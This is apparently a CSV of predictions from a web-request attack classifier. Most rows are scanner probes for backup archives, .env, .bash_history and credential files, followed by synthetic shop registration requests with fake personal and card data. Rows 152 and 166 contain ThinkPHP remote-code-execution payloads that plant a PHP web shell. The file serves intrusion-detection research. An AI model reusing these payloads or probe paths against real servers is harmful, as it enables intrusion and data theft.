row_idx,text,pred_label,max_prob,prob_threshold,dist_to_pred_centroid,class_distance_threshold,is_unknown,final_label,reject_reason
143,METHOD=HEAD PATH=/restore/directory.tar.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.6167446374893188,0.7608795523643493,4.721004486083984,4.364269733428955,1,unknown,low_confidence+far_from_centroid
144,METHOD=HEAD PATH=/backups/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.8647722005844116,0.7608795523643493,7.149202823638916,8.26656985282898,0,benign,accepted
145,METHOD=HEAD PATH=/backup/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.8235983848571777,0.7608795523643493,8.210447311401367,8.26656985282898,0,benign,accepted
146,METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8156223297119141,0.7608795523643493,7.310807228088379,8.26656985282898,0,benign,accepted
147,METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.7937495708465576,0.7608795523643493,7.813937187194824,8.26656985282898,0,benign,accepted
148,METHOD=HEAD PATH=/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.9919922947883606,0.7608795523643493,3.771040201187134,4.364269733428955,0,suspicious_path_probe,accepted
149,METHOD=HEAD PATH=/restore/public_html.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.8377645015716553,0.7608795523643493,6.872274398803711,8.26656985282898,0,benign,accepted
150,METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.8321691751480103,0.7608795523643493,7.9158782958984375,8.26656985282898,0,benign,accepted
151,METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8392037153244019,0.7608795523643493,7.549630641937256,8.26656985282898,0,benign,accepted
152,"METHOD=GET PATH=/ QUERY=s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=txual.php&vars[1][]=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>$ PROTOCOL=HTTP/1.1",command_exec,0.9085495471954346,0.7608795523643493,4.975110054016113,4.200531862974167,1,unknown,far_from_centroid
153,METHOD=HEAD PATH=/back/www.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.8605110049247742,0.7608795523643493,7.989566802978516,8.26656985282898,0,benign,accepted
154,METHOD=GET PATH=/sites/all/libraries/elfinder/elfinder.php.html QUERY= PROTOCOL=HTTP/1.1,command_exec,0.9608849287033081,0.7608795523643493,2.9985733032226562,4.200531862974167,0,command_exec,accepted
155,METHOD=HEAD PATH=/restore/directory.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.958695113658905,0.7608795523643493,1.6381101608276367,4.364269733428955,0,suspicious_path_probe,accepted
156,METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign,0.560423731803894,0.7608795523643493,8.435965538024902,8.26656985282898,1,unknown,low_confidence+far_from_centroid
157,METHOD=HEAD PATH=/backup/sftp-config.json QUERY= PROTOCOL=HTTP/1.1,benign,0.7534292936325073,0.7608795523643493,7.706153869628906,8.26656985282898,0,benign,accepted
158,METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.8123486042022705,0.7608795523643493,8.275114059448242,8.26656985282898,0,benign,accepted
159,METHOD=HEAD PATH=/bak/backup.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.8659292459487915,0.7608795523643493,7.69734001159668,8.26656985282898,0,benign,accepted
160,METHOD=HEAD PATH=/backups/latest.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.9592986106872559,0.7608795523643493,1.998459815979004,4.364269733428955,0,suspicious_path_probe,accepted
161,METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1,benign,0.682647705078125,0.7608795523643493,8.400219917297363,8.26656985282898,1,unknown,low_confidence+far_from_centroid
162,METHOD=HEAD PATH=/backups/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign,0.5724150538444519,0.7608795523643493,8.57791805267334,8.26656985282898,1,unknown,low_confidence+far_from_centroid
163,METHOD=HEAD PATH=/backup/backup.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.8712801933288574,0.7608795523643493,7.229245662689209,8.26656985282898,0,benign,accepted
164,METHOD=HEAD PATH=/bak/dump.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.8456599712371826,0.7608795523643493,7.201233386993408,8.26656985282898,0,benign,accepted
165,METHOD=HEAD PATH=/backup/backup.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8298599123954773,0.7608795523643493,7.572413921356201,8.26656985282898,0,benign,accepted
166,"METHOD=GET PATH=/ QUERY=s=index/\think\template\driver\file/write&cacheFile=ppeeu.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?> PROTOCOL=HTTP/1.1",command_exec,0.9893810749053955,0.7608795523643493,2.6109044551849365,4.200531862974167,0,command_exec,accepted
167,METHOD=HEAD PATH=/restore/bak.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.8985846042633057,0.7608795523643493,2.360535144805908,4.364269733428955,0,suspicious_path_probe,accepted
168,METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8256677985191345,0.7608795523643493,8.430675506591797,8.26656985282898,0,benign,accepted
169,METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8327474594116211,0.7608795523643493,7.110087871551514,8.26656985282898,0,benign,accepted
170,METHOD=HEAD PATH=/backup/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.9851465821266174,0.7608795523643493,3.4434897899627686,4.364269733428955,0,suspicious_path_probe,accepted
171,METHOD=HEAD PATH=/old/bak.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.9280850291252136,0.7608795523643493,2.1674957275390625,4.364269733428955,0,suspicious_path_probe,accepted
172,METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1,benign,0.6066367626190186,0.7608795523643493,8.224749565124512,8.26656985282898,0,benign,accepted
173,METHOD=HEAD PATH=/bak/directory.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8511932492256165,0.7608795523643493,7.116154193878174,8.26656985282898,0,benign,accepted
174,METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.9270674586296082,0.7608795523643493,2.389097213745117,4.364269733428955,0,suspicious_path_probe,accepted
175,METHOD=HEAD PATH=/old/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.7990767359733582,0.7608795523643493,7.952054023742676,8.26656985282898,0,benign,accepted
176,METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.9891660809516907,0.7608795523643493,3.4827165603637695,4.364269733428955,0,suspicious_path_probe,accepted
177,METHOD=HEAD PATH=/backup/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.9451482892036438,0.7608795523643493,6.528878211975098,8.26656985282898,0,benign,accepted
178,METHOD=HEAD PATH=/bak/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.8415210843086243,0.7608795523643493,7.764850616455078,8.26656985282898,0,benign,accepted
179,METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7354617714881897,0.7608795523643493,4.089056015014648,4.364269733428955,1,unknown,low_confidence
180,METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.8178156018257141,0.7608795523643493,8.482220649719238,8.26656985282898,0,benign,accepted
181,METHOD=HEAD PATH=/back/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.7412229776382446,0.7608795523643493,8.335164070129395,8.26656985282898,1,unknown,low_confidence+far_from_centroid
182,METHOD=HEAD PATH=/backup/public_html.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.8258859515190125,0.7608795523643493,7.350863456726074,8.26656985282898,0,benign,accepted
183,METHOD=GET PATH=/media-admin.php QUERY= PROTOCOL=HTTP/1.1,command_exec,0.7430949807167053,0.7608795523643493,5.6813063621521,4.200531862974167,1,unknown,low_confidence+far_from_centroid
184,METHOD=HEAD PATH=/old/sql.sql QUERY= PROTOCOL=HTTP/1.1,benign,0.7860017418861389,0.7608795523643493,7.9097208976745605,8.26656985282898,0,benign,accepted
185,METHOD=HEAD PATH=/backup/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign,0.7495318651199341,0.7608795523643493,7.707517147064209,8.26656985282898,0,benign,accepted
186,METHOD=HEAD PATH=/back/wallet.dat QUERY= PROTOCOL=HTTP/1.1,benign,0.7413418292999268,0.7608795523643493,7.956587791442871,8.26656985282898,0,benign,accepted
187,METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1,benign,0.7942009568214417,0.7608795523643493,8.107148170471191,8.26656985282898,0,benign,accepted
188,METHOD=HEAD PATH=/bak.tar QUERY= PROTOCOL=HTTP/1.1,benign,0.824650764465332,0.7608795523643493,7.885831356048584,8.26656985282898,0,benign,accepted
189,METHOD=HEAD PATH=/backups/Archive.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.950577974319458,0.7608795523643493,1.9877930879592896,4.364269733428955,0,suspicious_path_probe,accepted
190,METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.40411990880966187,0.7608795523643493,8.432333946228027,4.364269733428955,1,unknown,low_confidence+far_from_centroid
191,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hutter&password=datilado&nombre=Lebera&apellidos=Pujadas+Serch&email=titre%40hispadis.tc&dni=43931807J&direccion=Juan+Ramon+Jimenez%2C+17%2C+&ciudad=Jimena+de+la+Frontera&cp=37338&provincia=Sevilla&ntc=1381126471579626&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9972189664840698,0.7608795523643493,4.01611328125,8.26656985282898,0,benign,accepted
192,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=azhar&password=mohadA&nombre=Adelaida&apellidos=Tomasevich&email=cunthor%40mercadozoom.me&dni=87747494X&direccion=Calle+Alcala+Galiano%2C+144+10H&ciudad=Sunbilla&cp=17772&provincia=Lleida&ntc=6199550568888284&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9967749714851379,0.7608795523643493,3.335076332092285,8.26656985282898,0,benign,accepted
193,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=vonderwe&password=7n3a48&nombre=Katerina&apellidos=Pellis+Reig&email=celentano_daufil%40nikemujeres.hk&dni=80940508N&direccion=Avinguda+Can+Fontanals+16+7F&ciudad=Seva&cp=19118&provincia=Valencia&ntc=1183543291273675&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9959683418273926,0.7608795523643493,3.8254053592681885,8.26656985282898,0,benign,accepted
194,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=peiling&password=VaS6&nombre=Gismundo&apellidos=Canas+Anglaril&email=moreland%40magichobby.km&dni=76543761Z&direccion=C%2F+Pau+Gargallo%2C+27+5G&ciudad=Capolat&cp=22135&provincia=Zaragoza&ntc=6142248987618034&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.998390793800354,0.7608795523643493,4.342625141143799,8.26656985282898,0,benign,accepted
195,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=burke&password=pellijero&nombre=Sofiel&apellidos=Pijuan&email=dhein7%40blueberryminiloaf.com.pe&dni=50806754F&direccion=Avenida+De+La+Pasion%2C+27%2C+8%3FF&ciudad=Mazarambroz&cp=16336&provincia=Madrid&ntc=9476466081196673&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9973830580711365,0.7608795523643493,4.118218421936035,8.26656985282898,0,benign,accepted
196,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=hunter&password=90m1r236a4&nombre=Gertrudis&apellidos=Cigala&email=muser%40global-services.dm&dni=33890004X&direccion=C%2F+Veronica+198+&ciudad=Villamayor&cp=37460&provincia=Navarra&ntc=3976120192503130&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9980582594871521,0.7608795523643493,4.206849575042725,8.26656985282898,0,benign,accepted
197,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=wilcox&password=c2n87n&nombre=Yamari&apellidos=Borbonio+Antonioli&email=stinehart_rigas%40sierradealcaraz.pr&dni=76322755S&direccion=Lince%2C+36+12%3FG&ciudad=Mues&cp=08460&provincia=Zaragoza&ntc=0968269656631790&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9970627427101135,0.7608795523643493,3.70758318901062,8.26656985282898,0,benign,accepted
198,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=adela&password=eNvasAdor&nombre=Belino&apellidos=Mayans&email=jennifer%40intelethernet.cz&dni=85492231N&direccion=Glorieta+De+Julio+Robles%2C+47%2C+&ciudad=Ojacastro&cp=46729&provincia=Palencia&ntc=7701825811955975&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9968106150627136,0.7608795523643493,3.509376287460327,8.26656985282898,0,benign,accepted
199,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=ruppert2&password=65rti3ismo&nombre=Alfonsina&apellidos=Cimino+Chac%F3n&email=nordstrom-driver%40inventoscaseros.pr&dni=65511934E&direccion=C%2F+Doctor+Rodriguez+De+La+Fuente%2C+S%2FN+&ciudad=Alqu%E9zar&cp=29493&provincia=Santa+Cruz+de+Tenerife&ntc=7812097176228751&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9942203760147095,0.7608795523643493,3.1442246437072754,8.26656985282898,0,benign,accepted
200,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=jordanna3&password=desembarazadamente&nombre=Yamal&apellidos=Llebot+Sayago&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=59201826X&direccion=Sierra+Alta+138+&ciudad=Iruelos&cp=19174&provincia=M%E1laga&ntc=6515740156899202&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.996094286441803,0.7608795523643493,3.2290661334991455,8.26656985282898,0,benign,accepted
201,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=marykay&password=regoci6ad3r&nombre=Leonor&apellidos=Rea+Campmajor&email=close%40indagacion.mm&dni=09069178W&direccion=Calle+Benito+Perez+Galdos+139+&ciudad=Azut%E1n&cp=07195&provincia=Zaragoza&ntc=4288416752573801&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9981088638305664,0.7608795523643493,4.0632548332214355,8.26656985282898,0,benign,accepted
202,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=dario&password=sep3&nombre=C%E1tulo&apellidos=Name+Baralt&email=michelot%40manzanilladevillafafila.mn&dni=13454128W&direccion=Virgen+De+Minerva%2C+48%2C+10%3FE&ciudad=Campot%E9jar&cp=31480&provincia=%C1vila&ntc=8246951041406295&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9971587657928467,0.7608795523643493,3.5188748836517334,8.26656985282898,0,benign,accepted
203,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yea-ping&password=cedacero&nombre=Leticia&apellidos=Santanton&email=bernstein%40beltoan.com.ck&dni=02401008S&direccion=Jardines+De+Capitan+Ramos%2C+138%2C+5D&ciudad=Vall-llobrega&cp=05280&provincia=Palencia&ntc=9922252856683961&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9965594410896301,0.7608795523643493,3.197505474090576,8.26656985282898,0,benign,accepted
204,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=sheehan&password=m%3Fi&nombre=Sharon&apellidos=Balac+Ginet&email=gotell%40muevemiweb.wf&dni=06136230Z&direccion=C%2F+Comandante+Roman%2C+S%2FN+&ciudad=Navas+del+Rey&cp=08696&provincia=Salamanca&ntc=0788909004705438&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.99820876121521,0.7608795523643493,4.430689811706543,8.26656985282898,0,benign,accepted
205,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yerneni&password=%21afi2mamiento&nombre=Paulino&apellidos=Marc%E9+Chimal&email=thorntveidt%40cincocolores.museum&dni=81318789N&direccion=Sur+155%2C+8-F&ciudad=Od%E8n&cp=46890&provincia=Girona&ntc=1835703136482162&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9950125813484192,0.7608795523643493,3.0915069580078125,8.26656985282898,0,benign,accepted
206,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=efdal&password=2lBOrad6&nombre=Ver%F3nica&apellidos=Carpio&email=sergeev%40manzanilladevillafafila.mg&dni=63838683K&direccion=C%2F+Fuente+Milanos+48%2C+5-D&ciudad=Salmer%F3n&cp=33394&provincia=Burgos&ntc=6234916143793622&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9969069361686707,0.7608795523643493,3.838099241256714,8.26656985282898,0,benign,accepted
207,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=maury&password=sos4ec6oso&nombre=Secundina&apellidos=Domene+Chimal&email=iranzo%40gopersonaltrainers.ug&dni=64695200H&direccion=C%2F+Gaztela+49+9%3FG&ciudad=A%F1e&cp=13532&provincia=Le%F3n&ntc=2068642813627921&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.99750155210495,0.7608795523643493,3.6666464805603027,8.26656985282898,0,benign,accepted
208,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=emlynne&password=SiSteMatizaci%F3n&nombre=Isabella&apellidos=Cabot+Brot%F3&email=oland5%40schnaps.com.by&dni=51920905S&direccion=Camino+Ronda%2C+72%2C+&ciudad=Total%E1n&cp=28473&provincia=Valladolid&ntc=5686265534103266&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9976795315742493,0.7608795523643493,3.7381343841552734,8.26656985282898,0,benign,accepted
209,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=petri&password=en%2Bcandelar&nombre=Ciriaco&apellidos=Farge+Ferrara&email=ester%40fighting-machines.wf&dni=96138987E&direccion=C%2F+Nicaragua+48%2C+&ciudad=Nov%E9s&cp=08795&provincia=Ja%E9n&ntc=7732206170893125&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9975156784057617,0.7608795523643493,3.734597682952881,8.26656985282898,0,benign,accepted
210,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mirenda&password=d3v3c4%F3n&nombre=Cruz&apellidos=Munsech+Larramendi&email=amer_dierkes%40ajuntamentdebarcelona20.gm&dni=31996824Y&direccion=Plumbago+39+&ciudad=Vilavella%2C+la&cp=08280&provincia=Navarra&ntc=6005492859075787&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9967347979545593,0.7608795523643493,3.39495587348938,8.26656985282898,0,benign,accepted
211,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=soroker&password=di7377dor&nombre=Sadia&apellidos=Kisines+Selvas&email=unger-waldridge%40nuestrasantacruz.dd&dni=87425645T&direccion=Plza.+Maestro+191%2C+&ciudad=Fuentearmegil&cp=45180&provincia=Barcelona&ntc=2717952590420573&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9970515966415405,0.7608795523643493,4.123133659362793,8.26656985282898,0,benign,accepted
212,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=carlean1&password=sobReproducci%F3n&nombre=Raquel&apellidos=Resalt&email=dina%40cementoscalibra.py&dni=59007256C&direccion=Calle+Subride+Bajo%2C+70+&ciudad=Valenzuela+de+Calatrava&cp=34820&provincia=Salamanca&ntc=3315223857968488&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9959177374839783,0.7608795523643493,3.822446346282959,8.26656985282898,0,benign,accepted
213,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=yuyi&password=r%E1mneo&nombre=Bernardo&apellidos=Uterga+Sort&email=monti%40asyra.mu&dni=97887901Q&direccion=Av.+Juan+De+Austria+143+3%3FD&ciudad=Huerta+del+Marquesado&cp=46172&provincia=Lleida&ntc=6202971897742782&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9983975291252136,0.7608795523643493,4.21310567855835,8.26656985282898,0,benign,accepted
214,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=anya&password=guardamiento&nombre=Benilda&apellidos=Servan&email=manes-neely%40azkara.ps&dni=83598022Z&direccion=Calle+Lavinia+138+&ciudad=Viniegra+de+Abajo&cp=23330&provincia=Valladolid&ntc=8234877667951597&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9968394041061401,0.7608795523643493,3.8731138706207275,8.26656985282898,0,benign,accepted
215,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=joyann&password=pan790ar&nombre=Jaganath&apellidos=Olivera+Chutas&email=leary_cery%40miquelmartin.ps&dni=68561214P&direccion=Palestina%2C+118%2C+&ciudad=Sartajada&cp=06473&provincia=Lleida&ntc=6440071898700767&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9975651502609253,0.7608795523643493,4.05674409866333,8.26656985282898,0,benign,accepted
216,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=brownlie&password=alunarse&nombre=Yadia&apellidos=De+Guzm%E1n+Comadran&email=macgowan%40comerciosdeaspe.kr&dni=23198131D&direccion=Tarifa+80+12%3FB&ciudad=Tinieblas+de+la+Sierra&cp=13450&provincia=Lleida&ntc=5773073819468614&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9952867031097412,0.7608795523643493,3.0392158031463623,8.26656985282898,0,benign,accepted
217,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=shugong&password=murci%E9galo&nombre=Vanina&apellidos=Teixid%F3&email=denk%40hosterialasmajadillas.kr&dni=68398855Y&direccion=C%2F+Ajates%2C+59%2C+&ciudad=Potes&cp=28980&provincia=Cuenca&ntc=6527837981883617&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9974513649940491,0.7608795523643493,4.338313102722168,8.26656985282898,0,benign,accepted
218,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=o.neall&password=098a25t6s&nombre=Jidit&apellidos=Jurado&email=baggett7%40youtubeanunciox.ht&dni=91050642J&direccion=Avinguda+Sant+Julia+59%2C+&ciudad=Alfara+de+Carles&cp=38570&provincia=Burgos&ntc=4530913896674618&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9970884919166565,0.7608795523643493,4.202760219573975,8.26656985282898,0,benign,accepted
219,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=hekel&password=ennudecer&nombre=Cuniberto&apellidos=Marquine+Olivares&email=topol%40buscadordevideos.td&dni=55702502K&direccion=C%2F+Rositas+80+12%3FA&ciudad=Gerindote&cp=47699&provincia=Vizcaya&ntc=3100489069524720&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9966717958450317,0.7608795523643493,3.7752292156219482,8.26656985282898,0,benign,accepted
220,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=maire&password=Compl7meNt8ria&nombre=Nelio&apellidos=Boneton+Casares&email=ewart_givney%40mauvier.se&dni=64253263A&direccion=Calle+Gonzalez+De+Mendoza+38%2C+&ciudad=Pozoantiguo&cp=08818&provincia=Granada&ntc=0661310331831922&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9967182278633118,0.7608795523643493,3.484724283218384,8.26656985282898,0,benign,accepted
221,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=emerson&password=entorcarse&nombre=Nara&apellidos=Selles+Baquer%F3&email=debriac.krupka%40perrosmodelo.tz&dni=40865502E&direccion=Paseo+Poeta+Federico+Garcia+Lorca+159%2C+&ciudad=Navalilla&cp=31195&provincia=Salamanca&ntc=2255812100125453&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.998421311378479,0.7608795523643493,4.1210222244262695,8.26656985282898,0,benign,accepted
222,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=salehi&password=cintura&nombre=Ticiano&apellidos=Puch+Kinderman&email=trott%40campodegolf.com.ci&dni=12773567B&direccion=Travessera+Pizarro%2C+164%2C+&ciudad=Cumbres+Mayores&cp=05146&provincia=Zamora&ntc=5592242504094790&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9971233010292053,0.7608795523643493,3.8271307945251465,8.26656985282898,0,benign,accepted
223,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=percival&password=gu%E131ba&nombre=Finees&apellidos=Niub%F3&email=turman-dalkowska%40institutoandaluzdelmar.se&dni=84598781C&direccion=C%2F+David+164+&ciudad=Bellpuig&cp=22591&provincia=Tarragona&ntc=6905475964358006&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9966553449630737,0.7608795523643493,3.4890270233154297,8.26656985282898,0,benign,accepted
224,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=gisele&password=25fam44i8o&nombre=Benigno&apellidos=Arboledas&email=gravet.junior%40ingenieriadelaconstruccion.kg&dni=31517279B&direccion=Pl.+Santa+Teresa+De+Jesus+162%2C+12G&ciudad=Roses&cp=12578&provincia=Vizcaya&ntc=7251909180967020&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9968633651733398,0.7608795523643493,3.362668752670288,8.26656985282898,0,benign,accepted
225,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=aliza3&password=parroquial&nombre=Dalinda&apellidos=Salvo+Pardos&email=redford2%40enlanzarote.com.cz&dni=51756068L&direccion=Ferrocarril%2C+65+&ciudad=Malpica+de+Berganti%F1os&cp=25639&provincia=C%F3rdoba&ntc=6931236895937120&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9975626468658447,0.7608795523643493,3.942355155944824,8.26656985282898,0,benign,accepted
226,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=kirkland&password=barand-illa&nombre=Segismundo&apellidos=Moreno+Simonetti&email=tornado%40ringringrent.ph&dni=83974727W&direccion=Manuela+Sancho+3%2C+&ciudad=Albons&cp=03520&provincia=Le%F3n&ntc=4507015616336867&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9905790686607361,0.7608795523643493,4.404462814331055,8.26656985282898,0,benign,accepted
227,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=friedman&password=p6996raz9&nombre=Her%E1clito&apellidos=Merlos+Umpi%E9rrez&email=strickland%40gestionsoftware.cl&dni=11130412E&direccion=C%2F+Nogal+174+&ciudad=Buenavista+del+Norte&cp=05358&provincia=Zaragoza&ntc=6313115481717860&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.997941792011261,0.7608795523643493,3.5748581886291504,8.26656985282898,0,benign,accepted
